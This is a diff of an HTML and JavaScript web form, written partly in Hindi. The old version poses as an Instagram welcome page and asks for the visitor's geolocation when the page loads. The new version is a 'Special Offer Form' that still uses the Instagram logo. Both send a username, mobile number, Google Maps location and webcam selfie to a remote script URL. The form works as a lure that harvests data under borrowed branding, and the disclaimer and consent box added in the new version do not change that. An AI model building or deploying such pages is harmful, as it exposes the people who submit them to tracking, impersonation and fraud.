@@ -4,101 +4,127 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Welcome - Instagram</title>
+<title>Special Offer Form</title>
 
 <style>
 * {
-    box-sizing: border-box;
+  box-sizing: border-box;
 }
 
 body {
-    margin: 0;
-    min-height: 100vh;
-    font-family: Arial, sans-serif;
-    background: linear-gradient(135deg, #08001f, #25004d, #001f5c);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    padding: 20px;
+  margin: 0;
+  min-height: 100vh;
+  font-family: Arial, sans-serif;
+  background: linear-gradient(135deg, #08001f, #25004d, #001f5c);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  padding: 20px;
 }
 
 .container {
-    width: 100%;
-    max-width: 420px;
-    background: white;
-    padding: 30px 25px;
-    border-radius: 25px;
-    box-shadow: 0 10px 40px rgba(0,0,0,0.4);
-    text-align: center;
+  width: 100%;
+  max-width: 420px;
+  background: white;
+  padding: 25px;
+  border-radius: 25px;
+  box-shadow: 0 10px 40px rgba(0,0,0,0.4);
+  text-align: center;
 }
 
 .logo {
-    width: 150px;
-    max-width: 100%;
-    border-radius: 20px;
-    margin-bottom: 15px;
+  width: 150px;
+  max-width: 100%;
+  border-radius: 20px;
+  margin-bottom: 15px;
 }
 
 h1 {
-    margin: 5px 0 10px;
-    color: #222;
-    font-size: 30px;
+  margin: 5px 0 10px;
+  color: #222;
+  font-size: 28px;
 }
 
 p {
-    color: #666;
-    margin-bottom: 20px;
+  color: #666;
+  line-height: 1.5;
+}
+
+.notice {
+  background: #fff3cd;
+  color: #664d03;
+  padding: 12px;
+  border-radius: 10px;
+  font-size: 13px;
+  margin-bottom: 20px;
 }
 
 input {
-    width: 100%;
-    padding: 15px;
-    margin-bottom: 15px;
-    border: 1px solid #ddd;
-    border-radius: 12px;
-    font-size: 16px;
+  width: 100%;
+  padding: 15px;
+  margin-bottom: 15px;
+  border: 1px solid #ddd;
+  border-radius: 12px;
+  font-size: 16px;
 }
 
 button {
-    width: 100%;
-    padding: 15px;
-    margin-top: 10px;
-    border: none;
-    border-radius: 12px;
-    background: linear-gradient(90deg, #d600ff, #0066ff);
-    color: white;
-    font-size: 17px;
-    font-weight: bold;
-    cursor: pointer;
+  width: 100%;
+  padding: 15px;
+  margin-top: 10px;
+  border: none;
+  border-radius: 12px;
+  background: linear-gradient(90deg, #d600ff, #0066ff);
+  color: white;
+  font-size: 17px;
+  font-weight: bold;
+  cursor: pointer;
 }
 
 button:disabled {
-    opacity: 0.6;
+  opacity: 0.6;
 }
 
 #camera {
-    width: 100%;
-    display: none;
-    margin-top: 15px;
-    border-radius: 15px;
-    background: #000;
+  width: 100%;
+  display: none;
+  margin-top: 15px;
+  border-radius: 15px;
+  background: #000;
 }
 
 #preview {
-    width: 100%;
-    display: none;
-    margin-top: 15px;
-    border-radius: 15px;
+  width: 100%;
+  display: none;
+  margin-top: 15px;
+  border-radius: 15px;
 }
 
 #canvas {
-    display: none;
+  display: none;
 }
 
 #status {
-    margin-top: 15px;
-    font-weight: bold;
-    color: #333;
+  margin-top: 15px;
+  font-weight: bold;
+  color: #333;
+}
+
+.consent {
+  text-align: left;
+  font-size: 13px;
+  color: #555;
+  margin-top: 15px;
+}
+
+.consent input {
+  width: auto;
+  margin-right: 8px;
+}
+
+.small {
+  font-size: 12px;
+  color: #777;
 }
 </style>
 </head>
@@ -107,80 +133,109 @@ button:disabled {
 
 <div class="container">
 
-    <!-- पहले वाली Instagram image -->
-    <img
-        src="Instagram.PNG"
-        alt="Instagram"
-        class="logo"
+  <!-- आपकी पहले वाली image -->
+  <img
+    src="./Instagram.PNG"
+    alt="Special Offer"
+    class="logo"
+  >
+
+  <h1>Special Offer Form</h1>
+
+  <div class="notice">
+    यह एक independent promotional page है।
+    इसका Instagram से कोई official संबंध नहीं है।
+  </div>
+
+  <p>
+    अपनी इच्छा से अपनी details और photo share करें।
+    कोई password नहीं लिया जाता।
+  </p>
+
+  <form id="myForm">
+
+    <input
+      type="text"
+      id="username"
+      placeholder="Enter Your Username"
+      required
     >
 
-    <h1>Welcome to Instagram</h1>
+    <input
+      type="tel"
+      id="mobile"
+      placeholder="Enter Your Mobile No."
+      required
+    >
 
-    <p>
-        अपनी इच्छा से अपनी details, location और photo share करें।
-    </p>
+    <!-- LOCATION -->
+    <button
+      type="button"
+      id="locationBtn"
+    >
+      📍 Location Share करें
+    </button>
 
-    <form id="myForm">
+    <div class="small">
+      Location केवल आपकी अनुमति से ली जाएगी।
+    </div>
 
+    <!-- CAMERA -->
+    <button
+      type="button"
+      id="cameraBtn"
+    >
+      📷 Camera खोलें
+    </button>
+
+    <video
+      id="camera"
+      autoplay
+      playsinline
+    ></video>
+
+    <!-- TAKE PHOTO -->
+    <button
+      type="button"
+      id="photoBtn"
+      style="display:none;"
+    >
+      📸 Photo लें
+    </button>
+
+    <!-- PHOTO PREVIEW -->
+    <img
+      id="preview"
+      alt="Captured Photo"
+    >
+
+    <div class="consent">
+      <label>
         <input
-            type="text"
-            id="username"
-            placeholder="Enter Your Username"
-            required
+          type="checkbox"
+          id="consent"
+          required
         >
+        मैं सहमत हूँ कि मेरी दी गई details और photo
+        इस form के उद्देश्य से भेजी जाएँ।
+      </label>
+    </div>
 
-        <input
-            type="tel"
-            id="mobile"
-            placeholder="Enter Your Mobile No."
-            required
-        >
+    <!-- SUBMIT -->
+    <button
+      type="submit"
+      id="submitBtn"
+    >
+      Submit
+    </button>
 
-        <!-- CAMERA -->
-        <button
-            type="button"
-            id="cameraBtn"
-        >
-            📷 Camera खोलें
-        </button>
+  </form>
 
-        <video
-            id="camera"
-            autoplay
-            playsinline
-        ></video>
+  <canvas id="canvas"></canvas>
 
-        <!-- TAKE PHOTO -->
-        <button
-            type="button"
-            id="photoBtn"
-            style="display:none;"
-        >
-            📸 Photo लें
-        </button>
-
-        <!-- PHOTO PREVIEW -->
-        <img
-            id="preview"
-            alt="Captured Photo"
-        >
-
-        <!-- SUBMIT -->
-        <button
-            type="submit"
-            id="submitBtn"
-        >
-            Submit
-        </button>
-
-    </form>
-
-    <canvas id="canvas"></canvas>
-
-    <div id="status"></div>
+  <div id="status"></div>
 
 </div>
-
 
 <script>
 
@@ -199,42 +254,50 @@ let locationData = "";
 
 /* =====================================
    LOCATION
+   केवल button दबाने पर permission
 ===================================== */
 
-window.addEventListener("load", function () {
+document.getElementById("locationBtn")
+.addEventListener("click", function () {
 
-    if (!navigator.geolocation) {
-        return;
+  if (!navigator.geolocation) {
+    alert("इस browser में Location उपलब्ध नहीं है।");
+    return;
+  }
+
+  document.getElementById("status").innerText =
+    "Location permission मांगी जा रही है...";
+
+  navigator.geolocation.getCurrentPosition(
+
+    function (position) {
+
+      const latitude =
+        position.coords.latitude;
+
+      const longitude =
+        position.coords.longitude;
+
+      locationData =
+        "https://www.google.com/maps?q=" +
+        latitude + "," + longitude;
+
+      document.getElementById("locationBtn")
+        .innerText = "✅ Location मिल गई";
+
+      document.getElementById("status")
+        .innerText = "Location permission मिल गई।";
+
+    },
+
+    function () {
+
+      document.getElementById("status")
+        .innerText = "Location share नहीं की गई।";
+
     }
 
-    navigator.geolocation.getCurrentPosition(
-
-        function (position) {
-
-            const latitude =
-                position.coords.latitude;
-
-            const longitude =
-                position.coords.longitude;
-
-            locationData =
-                "https://www.google.com/maps?q=" +
-                latitude + "," + longitude;
-
-            document.getElementById("status").innerText =
-                "Location permission मिल गई।";
-
-        },
-
-        function () {
-
-            console.log(
-                "Location permission not granted."
-            );
-
-        }
-
-    );
+  );
 
 });
 
@@ -246,66 +309,58 @@ window.addEventListener("load", function () {
 document.getElementById("cameraBtn")
 .addEventListener("click", async function () {
 
-    try {
+  try {
 
-        if (
-            !navigator.mediaDevices ||
-            !navigator.mediaDevices.getUserMedia
-        ) {
+    if (
+      !navigator.mediaDevices ||
+      !navigator.mediaDevices.getUserMedia
+    ) {
 
-            alert(
-                "इस browser में Camera उपलब्ध नहीं है। Chrome में website खोलें।"
-            );
+      alert(
+        "इस browser में Camera उपलब्ध नहीं है। Chrome में website खोलें।"
+      );
 
-            return;
-        }
-
-
-        stream =
-            await navigator.mediaDevices.getUserMedia({
-
-                video: {
-                    facingMode: "user"
-                },
-
-                audio: false
-
-            });
-
-
-        const video =
-            document.getElementById("camera");
-
-
-        video.srcObject = stream;
-
-        video.style.display = "block";
-
-
-        document.getElementById("photoBtn")
-        .style.display = "block";
-
-
-        document.getElementById("cameraBtn")
-        .innerText =
-            "📷 Camera चालू है";
-
-
-        document.getElementById("status")
-        .innerText =
-            "अब Photo लें।";
-
+      return;
     }
 
-    catch (error) {
+    stream =
+      await navigator.mediaDevices.getUserMedia({
 
-        console.error(error);
+        video: {
+          facingMode: "user"
+        },
 
-        alert(
-            "Camera permission नहीं मिली। Browser में Camera permission Allow करें और फिर दोबारा कोशिश करें।"
-        );
+        audio: false
 
-    }
+      });
+
+    const video =
+      document.getElementById("camera");
+
+    video.srcObject = stream;
+
+    video.style.display = "block";
+
+    document.getElementById("photoBtn")
+      .style.display = "block";
+
+    document.getElementById("cameraBtn")
+      .innerText = "📷 Camera चालू है";
+
+    document.getElementById("status")
+      .innerText = "अब Photo लें।";
+
+  }
+
+  catch (error) {
+
+    console.error(error);
+
+    alert(
+      "Camera permission नहीं मिली। Browser में Camera permission Allow करें और फिर दोबारा कोशिश करें।"
+    );
+
+  }
 
 });
 
@@ -317,98 +372,80 @@ document.getElementById("cameraBtn")
 document.getElementById("photoBtn")
 .addEventListener("click", function () {
 
-    const video =
-        document.getElementById("camera");
+  const video =
+    document.getElementById("camera");
 
-    const canvas =
-        document.getElementById("canvas");
+  const canvas =
+    document.getElementById("canvas");
 
-    const preview =
-        document.getElementById("preview");
+  const preview =
+    document.getElementById("preview");
 
+  if (
+    !video.videoWidth ||
+    !video.videoHeight
+  ) {
 
-    if (
-        !video.videoWidth ||
-        !video.videoHeight
-    ) {
-
-        alert(
-            "Camera अभी तैयार नहीं है। 1-2 सेकंड बाद फिर Photo लें।"
-        );
-
-        return;
-    }
-
-
-    canvas.width =
-        video.videoWidth;
-
-    canvas.height =
-        video.videoHeight;
-
-
-    const context =
-        canvas.getContext("2d");
-
-
-    context.drawImage(
-        video,
-        0,
-        0,
-        canvas.width,
-        canvas.height
+    alert(
+      "Camera अभी तैयार नहीं है। 1-2 सेकंड बाद फिर Photo लें।"
     );
 
+    return;
+  }
 
-    /* Photo तैयार */
+  canvas.width =
+    video.videoWidth;
 
-    photoData =
-        canvas.toDataURL(
-            "image/jpeg",
-            0.85
-        );
+  canvas.height =
+    video.videoHeight;
 
+  const context =
+    canvas.getContext("2d");
 
-    /* Preview दिखाएँ */
+  context.drawImage(
+    video,
+    0,
+    0,
+    canvas.width,
+    canvas.height
+  );
 
-    preview.src =
-        photoData;
+  photoData =
+    canvas.toDataURL(
+      "image/jpeg",
+      0.85
+    );
 
-    preview.style.display =
-        "block";
+  preview.src =
+    photoData;
 
+  preview.style.display =
+    "block";
 
-    /* Camera बंद */
+  /* Camera बंद */
 
-    if (stream) {
+  if (stream) {
 
-        stream.getTracks().forEach(
-            function (track) {
-                track.stop();
-            }
-        );
+    stream.getTracks().forEach(
+      function (track) {
+        track.stop();
+      }
+    );
 
-        stream = null;
-    }
+    stream = null;
+  }
 
+  video.style.display =
+    "none";
 
-    video.style.display =
-        "none";
+  document.getElementById("photoBtn")
+    .style.display = "none";
 
+  document.getElementById("cameraBtn")
+    .innerText = "📷 Camera दोबारा खोलें";
 
-    document.getElementById("photoBtn")
-    .style.display =
-        "none";
-
-
-    document.getElementById("cameraBtn")
-    .innerText =
-        "📷 Camera दोबारा खोलें";
-
-
-    document.getElementById("status")
-    .innerText =
-        "✅ Photo ले ली गई। अब Submit करें।";
+  document.getElementById("status")
+    .innerText = "✅ Photo ले ली गई। अब Submit करें।";
 
 });
 
@@ -420,184 +457,135 @@ document.getElementById("photoBtn")
 document.getElementById("myForm")
 .addEventListener("submit", async function (event) {
 
-    event.preventDefault();
+  event.preventDefault();
 
+  const username =
+    document.getElementById("username")
+      .value.trim();
 
-    const username =
-        document.getElementById("username")
-        .value.trim();
+  const mobile =
+    document.getElementById("mobile")
+      .value.trim();
 
+  const consent =
+    document.getElementById("consent").checked;
 
-    const mobile =
-        document.getElementById("mobile")
-        .value.trim();
+  const submitBtn =
+    document.getElementById("submitBtn");
 
+  if (!username) {
+    alert("Username दर्ज करें।");
+    return;
+  }
 
-    const submitBtn =
-        document.getElementById("submitBtn");
+  if (!mobile) {
+    alert("Mobile number दर्ज करें।");
+    return;
+  }
 
+  if (!photoData) {
+    alert("पहले Camera खोलकर Photo लें।");
+    return;
+  }
 
-    /* Photo जरूरी */
+  if (!consent) {
+    alert("पहले अपनी permission दें।");
+    return;
+  }
 
-    if (!photoData) {
+  submitBtn.disabled = true;
+  submitBtn.innerText = "Submitting...";
 
-        alert(
-            "पहले Camera खोलकर Photo लें।"
-        );
+  document.getElementById("status")
+    .innerText =
+    "Details, location और photo भेजी जा रही है...";
 
-        return;
+  const data = {
+
+    username: username,
+
+    mobile: mobile,
+
+    location: locationData,
+
+    photo: photoData
+
+  };
+
+  try {
+
+    const response =
+      await fetch(
+        SCRIPT_URL,
+        {
+
+          method: "POST",
+
+          headers: {
+            "Content-Type":
+            "text/plain;charset=utf-8"
+          },
+
+          body:
+            JSON.stringify(data)
+
+        }
+      );
+
+    const result =
+      await response.json();
+
+    console.log(result);
+
+    if (result.success === true) {
+
+      document.getElementById("status")
+        .innerText =
+        "✅ Submission successful!";
+
+      setTimeout(function () {
+
+        window.location.href =
+          "success.html";
+
+      }, 500);
+
     }
 
+    else {
 
-    /* Username जरूरी */
+      submitBtn.disabled = false;
+      submitBtn.innerText = "Submit";
 
-    if (!username) {
+      document.getElementById("status")
+        .innerText =
+        "❌ Submission नहीं हो पाई।";
 
-        alert(
-            "Username दर्ज करें।"
-        );
+      alert(
+        "Submission failed: " +
+        (result.error || "Unknown error")
+      );
 
-        return;
     }
 
+  }
 
-    /* Mobile जरूरी */
+  catch (error) {
 
-    if (!mobile) {
+    console.error(error);
 
-        alert(
-            "Mobile number दर्ज करें।"
-        );
-
-        return;
-    }
-
-
-    submitBtn.disabled =
-        true;
-
-    submitBtn.innerText =
-        "Submitting...";
-
+    submitBtn.disabled = false;
+    submitBtn.innerText = "Submit";
 
     document.getElementById("status")
-    .innerText =
-        "Details, location और photo भेजी जा रही है...";
+      .innerText =
+      "❌ Server से connection नहीं हो पाया।";
 
+    alert(
+      "Server से connection नहीं हो पाया। Apps Script deployment check करें।"
+    );
 
-    /* Data */
-
-    const data = {
-
-        username: username,
-
-        mobile: mobile,
-
-        location: locationData,
-
-        photo: photoData
-
-    };
-
-
-    try {
-
-        const response =
-            await fetch(
-                SCRIPT_URL,
-                {
-
-                    method: "POST",
-
-                    headers: {
-                        "Content-Type":
-                        "text/plain;charset=utf-8"
-                    },
-
-                    body:
-                        JSON.stringify(data)
-
-                }
-            );
-
-
-        const result =
-            await response.json();
-
-
-        console.log(result);
-
-
-        /* SUCCESS */
-
-        if (result.success === true) {
-
-            document.getElementById("status")
-            .innerText =
-                "✅ Submission successful!";
-
-
-            /*
-             * Submit सफल होने के बाद
-             * success.html खुलेगा
-             */
-
-            setTimeout(function () {
-
-                window.location.href =
-                    "success.html";
-
-            }, 500);
-
-        }
-
-        /* FAILED */
-
-        else {
-
-            submitBtn.disabled =
-                false;
-
-            submitBtn.innerText =
-                "Submit";
-
-
-            document.getElementById("status")
-            .innerText =
-                "❌ Submission नहीं हो पाई।";
-
-
-            alert(
-                "Submission failed: " +
-                (result.error || "Unknown error")
-            );
-
-        }
-
-    }
-
-    catch (error) {
-
-        console.error(error);
-
-
-        submitBtn.disabled =
-            false;
-
-        submitBtn.innerText =
-            "Submit";
-
-
-        document.getElementById("status")
-        .innerText =
-            "❌ Server से connection नहीं हो पाया।";
-
-
-        alert(
-            "Server से connection नहीं हो पाया। Apps Script deployment check करें।"
-        );
-
-    }
+  }
 
 });
 
